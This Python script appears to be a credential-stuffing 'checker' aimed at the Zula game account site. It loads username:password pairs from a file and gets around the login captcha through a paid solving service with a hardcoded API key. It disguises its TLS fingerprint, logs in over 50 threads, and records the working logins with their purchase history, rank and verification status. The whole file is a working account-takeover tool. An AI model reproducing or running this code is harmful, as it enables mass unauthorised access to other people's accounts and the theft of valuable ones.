import requests
import re
import time
import tls_client
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import random
from loguru import logger

api_key = "CAP-19B2D2C3D08FD1325CA82490981EA13F"
site_key = "0x4AAAAAAAyOAhZopAtgo73i"
site_url = "https://hesap.zulaoyun.com/zula-giris-yap"
checked_accounts = set()

def create_captcha_task():
    payload = {
        "clientKey": api_key,
        "task": {
            "type": 'AntiTurnstileTaskProxyLess',
            "websiteKey": site_key,
            "websiteURL": site_url,
            "metadata": {"action": ""}
        }
    }
    return requests.post("https://api.capsolver.com/createTask", json=payload).json().get("taskId")

def get_captcha_solution(task_id):
    while task_id:
        time.sleep(1)
        payload = {
            "clientKey": api_key,
            "taskId": task_id
        }
        res = requests.post("https://api.capsolver.com/getTaskResult", json=payload)
        result = res.json()
        if result.get("status") == "ready":
            return result.get("solution", {}).get('token')
        elif result.get("status") == "failed" or result.get("errorId"):
            return None

def get_verification_token(client, headers):
    response = client.get(site_url, headers=headers)
    response_text = response.text
    token_match = re.search(r'name="__RequestVerificationToken" type="hidden" value="(.*?)"', response_text)
    return token_match.group(1) if token_match else None

def rank_converter(rank_url):
    ranks = {
        "https://img.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/ranks/lbc_rank_icon_01.png": "Acemi",
        "https://img.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/ranks/lbc_rank_icon_02.png": "Bronz",
        "https://img.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/ranks/lbc_rank_icon_03.png": "Gümüş",
        "https://img.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/ranks/lbc_rank_icon_04.png": "Altın",
        "https://img.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/ranks/lbc_rank_icon_05.png": "Zümrüt",
        "https://img.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/ranks/lbc_rank_icon_06.png": "Elmas",
        "https://img.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/ranks/lbc_rank_icon_07.png": "Elit",
        "https://img.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/ranks/lbc_rank_icon_08.png": "Usta",
        "https://img.zulaoyun.com/sitecdn/TR/Content/hesapzulaoyun/images/ranks/lbc_rank_icon_09.png": "Efsane",
    }
    return ranks.get(rank_url, "Bulunamadı")

def process_account(username, password):
    account_key = f"{username}:{password}"
    if account_key in checked_accounts:
        return
    checked_accounts.add(account_key)
    session = tls_client.Session(
        client_identifier="chrome_120",
        random_tls_extension_order=True
    )
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
    }
    for attempt in range(3):
        try:
            #proxy = random.choice(open("proxy.txt", "r").readlines()).strip()
            #session.proxies = {'http': 'http://' + proxy, 'https': 'http://' + proxy}
            verification_token = get_verification_token(session, headers)
            turnstile_token = get_captcha_solution(create_captcha_task())
            if verification_token is None or turnstile_token is None:
                continue
            data = {
                '__RequestVerificationToken': verification_token,
                'ReturnUrl': '/',
                'UserName': username,
                'Password': password,
                'cf_turnstile_response': turnstile_token,
                'RememberMe': 'false',
            }
            login = session.post(site_url, headers=headers, data=data, allow_redirects=True)
            if '/profile' in login.text:
                payments = session.get("https://hesap.zulaoyun.com/profil/odeme-gecmisi", headers=headers, allow_redirects=True)
                soup = BeautifulSoup(payments.text, "html.parser")
                total_za = 0
                for row in soup.select("table.table tbody tr"):
                    product = row.select_one("td:nth-child(3)").text
                    za_amount = re.search(r"([\d.]+)\s*ZA?", product)
                    if za_amount:
                        total_za += float(za_amount.group(1).replace(".", ""))
                details = session.get("https://hesap.zulaoyun.com/profil", headers=headers, allow_redirects=True)
                soup = BeautifulSoup(details.text, "html.parser")
                nickname = soup.find("div", class_="profile-content-user-name").text.strip() if soup.find("div", class_="profile-content-user-name") else "Bulunamadı"
                level = soup.select_one(".progress-bar-text").text.strip() if soup.select_one(".progress-bar-text") else "Bulunamadı"
                kd = soup.find("div", class_="profile-data-content clr").find("div", class_="profile-data-content-top").find("div", class_="yellow-box yellow-box-title kd").find("span").text.replace(',','.').strip() if soup.find("div", class_="profile-data-content clr") else "Bulunamadı"
                icon_img = soup.find("img", alt="Performans")
                icon_img_src = icon_img["src"] if icon_img else "Bulunamadı"
                registration_date = soup.select_one("p:-soup-contains('KAYIT TARİHİ') span").text.strip() if soup.select_one("p:-soup-contains('KAYIT TARİHİ') span") else "Bulunamadı"
                za_amount = "{:,.0f}".format(total_za).replace(',', '.')
                security = session.get("https://hesap.zulaoyun.com/profil/duzenle", headers=headers, allow_redirects=True)
                mail_verified = "(+)" if 'id="txtEMailVerify" placeholder="Doğrulama Tamamlandı"' in security.text else "(-)"
                phone_verified = "(+)" if 'id="txtMobilePhoneVerify" placeholder="Doğrulama Tamamlandı"' in security.text else "(-)"
                if za_amount != "0":
                    logger.success(f"{username}:{password} | Username: {nickname} | Level: {level} | KD {kd} | Rank: {rank_converter(icon_img_src)} | Registration: {registration_date} | ZA History: {za_amount} | Mail Verified: {mail_verified} | Phone Verified: {phone_verified}")
                    with open(f"success.txt", "a") as f:
                        f.write(f"{username}:{password} | Username: {nickname} | Level: {level} | KD {kd} | Rank: {rank_converter(icon_img_src)} | Registration: {registration_date} | ZA History: {za_amount} | Mail Verified: {mail_verified} | Phone Verified: {phone_verified}\n")
                return
        except Exception as e:
            if attempt == 2:
                with open("error.txt", "a") as f:
                    f.write(f"{username}:{password}\n")
        time.sleep(2)

def load_accounts(filename):
    with open(filename, 'r') as file:
        accounts = [line.strip().split(':') for line in file.readlines() if line.strip()]
    return accounts

if __name__ == "__main__":
    accounts = load_accounts('accounts.txt')
    with ThreadPoolExecutor(max_workers=50) as executor:
        executor.map(lambda account: process_account(*account), accounts)
